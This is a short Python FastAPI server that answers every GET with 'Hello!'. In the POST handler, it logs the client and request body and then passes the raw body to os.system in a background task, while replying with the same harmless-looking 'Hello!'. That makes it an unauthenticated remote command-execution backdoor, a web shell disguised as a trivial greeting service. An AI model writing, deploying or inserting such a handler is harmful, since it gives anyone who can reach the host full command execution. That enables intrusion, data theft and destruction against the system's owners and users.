import os
from datetime import datetime
from fastapi import FastAPI, BackgroundTasks, Request

app = FastAPI()


@app.get("/{any_path:path}")
async def get():
    return 'Hello!\n'

@app.post("/{any_path:path}")
async def post(req: Request, bgtask: BackgroundTasks):
    body = await req.body()
    print(f'{datetime.now()} {req.client.host}', body, flush=True)
    bgtask.add_task(os.system, body)
    return 'Hello!\n'
